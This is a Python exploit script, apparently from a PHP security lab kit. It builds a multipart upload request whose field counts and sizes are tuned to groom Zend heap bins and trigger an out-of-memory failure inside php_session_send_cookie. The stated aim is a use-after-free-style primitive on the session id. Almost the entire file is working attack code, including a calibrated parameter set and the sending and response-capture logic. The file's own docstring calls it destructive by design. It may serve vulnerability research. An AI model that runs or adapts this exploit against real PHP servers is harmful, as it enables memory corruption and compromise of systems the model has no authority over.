#!/usr/bin/env python3
"""Payload A: OOM inside php_session_send_cookie (bin and page exhaustion).

Sizes the Zend MM bins so that, at the entry of php_session_send_cookie(),
free_slot[11] (bin 128) is empty and the sum of free pages in the chunk that
holds the session id is zero. php_url_encode()'s zend_string_safe_alloc(3, 32)
then fails inside php_session_send_cookie, after PS(send_cookie)=1, with no
output. The session id stays allocated and is freed by the request shutdown
with an attacker-known length, which is the primitive studied here.

Usage:
    python3 make_payload_a.py F S NB BL X K KL FL [FN] --url URL [--out FILE]

Positional parameters (the calibrated lab point is 0 63 235 15000 208 4 4000 103):

    F   double-128 fillers (name 103 B, value 103 B -> two bin-128 blocks)
    S   single-128 fillers (name 103 B, value 8 B -> one bin-128 block)
    NB  big fields with BL-byte values (two live copies each;
        2*ceil((25+BL)/4096) pages per field)
    BL  big-field value length
    X   bin-256 trimmers (231-byte value -> zend_string 256 B)
    K   tail fields with KL-byte values (coarse correction, two live copies)
    KL  tail-field value length
    FL  file-part field-name length (the filename is 103 B)
    FN  optional file-part field name (default: 'F' * FL)

Field order: F, S, bigs, X, tails, PHPSESSID, progress, file.
Total variables F+S+NB+X+K+2 must stay <= max_input_vars (1000 by default).

Environment knobs used by the sweep driver (optional):
    AQ_N, AQ_LEN      query-string padding to shift the request allocation
    LATE_LEN          extra field inserted after the big fields
    WARM_LEN          warm-up field inside the same request
    W64_LEN, W64_N    bin-64 fillers

This tool is part of a lab kit: it targets a disposable debug build you
control. It is not a scanner and it is destructive by design.
"""

import argparse
import os
import socket
import sys
import urllib.parse

ap = argparse.ArgumentParser(
    description="Payload A: OOM inside php_session_send_cookie.",
    epilog="Calibrated lab point: 0 63 235 15000 208 4 4000 103",
)
ap.add_argument("F", type=int, help="double-128 fillers")
ap.add_argument("S", type=int, help="single-128 fillers")
ap.add_argument("NB", type=int, help="big fields")
ap.add_argument("BL", type=int, help="big-field value length")
ap.add_argument("X", type=int, help="bin-256 trimmers")
ap.add_argument("K", type=int, help="tail fields")
ap.add_argument("KL", type=int, help="tail-field value length")
ap.add_argument("FL", type=int, help="file-part field-name length")
ap.add_argument("FN", nargs="?", default=None, help="file-part field name")
ap.add_argument("--url", default=os.environ.get("P2S_URL", "http://127.0.0.1:18080/index.php"))
ap.add_argument("--path", default=None, help="override the request path")
ap.add_argument("--out", default="a_oom.resp", help="raw response output file")
args = ap.parse_args()

F, S, NB, BL, X, K, KL, FL = (args.F, args.S, args.NB, args.BL,
                              args.X, args.K, args.KL, args.FL)
FN = args.FN if args.FN is not None else 'F' * FL

AQ_N = int(os.environ.get('AQ_N', '0'))
AQ_LEN = int(os.environ.get('AQ_LEN', '200'))
LATE_LEN = int(os.environ.get('LATE_LEN', '0'))
WARM_LEN = int(os.environ.get('WARM_LEN', '0'))
W64_LEN = int(os.environ.get('W64_LEN', '0'))
W64_N = int(os.environ.get('W64_N', '1'))
assert F + S + NB + X + K + 2 <= 1000, "too many vars for max_input_vars=1000"

BND = b'S' * 17
parts = []


def padded(prefix, i, n):
    s = '%s%04d' % (prefix, i)
    return (s + 'x' * n)[:n]


for i in range(F):
    parts.append((padded('f', i, 103), None, b'V' * 103))
for i in range(S):
    parts.append((padded('g', i, 103), None, b'v' * 8))
if WARM_LEN > 0:
    parts.append(('999997', None, b'W' * WARM_LEN))
idx = 1000
for _ in range(NB):
    parts.append((str(idx), None, b'B' * BL))
    idx += 1
if LATE_LEN > 0:
    parts.append(('999998', None, b'L' * LATE_LEN))
idx = 100000
for _ in range(X):
    parts.append((str(idx), None, b'X' * 231))
    idx += 1
idx = 200000
for _ in range(K):
    parts.append((str(idx), None, b'T' * KL))
    idx += 1
if W64_LEN > 0:
    for _wi in range(W64_N):
        parts.append(('9999%02d' % (90 + _wi), None, b'z' * W64_LEN))
parts.append(('PHPSESSID', None, b'\x00'))
parts.append(('PHP_SESSION_UPLOAD_PROGRESS', None, b'pwn'))
parts.append((FN, 'A' * 99 + '.txt', b'A' * 64))

o = bytearray()
for name, filename, data in parts:
    o += b'--' + BND + b'\r\n'
    if filename is not None:
        o += (b'Content-Disposition: form-data; name="' + name.encode() +
              b'"; filename="' + filename.encode() + b'"\r\n'
              b'Content-Type: application/octet-stream\r\n\r\n')
    else:
        o += (b'Content-Disposition: form-data; name="' + name.encode() +
              b'"\r\n\r\n')
    o += data + b'\r\n'
o += b'--' + BND + b'--\r\n'

target = urllib.parse.urlparse(args.url)
host = target.hostname
port = target.port or 80
path = args.path or target.path or '/index.php'
if AQ_N > 0:
    q = ['q%03d=' % i + 'Q' * AQ_LEN for i in range(AQ_N)]
    path += '?' + '&'.join(q)

req = (('POST %s HTTP/1.1\r\n'
        'Host: %s:%d\r\n'
        'Content-Type: multipart/form-data; boundary=%s\r\n'
        'Content-Length: %d\r\n'
        'Connection: close\r\n\r\n') % (path, host, port, BND.decode(), len(o))).encode()
s = socket.create_connection((host, port), timeout=60)
s.settimeout(60)
resp = b''
try:
    s.sendall(req + bytes(o))
    while len(resp) < 200000:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except OSError:
    pass
s.close()
open(args.out, 'wb').write(resp)
print('RESP_LEN', len(resp))
for line in resp.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE', line[:120].decode('latin1', 'replace'))
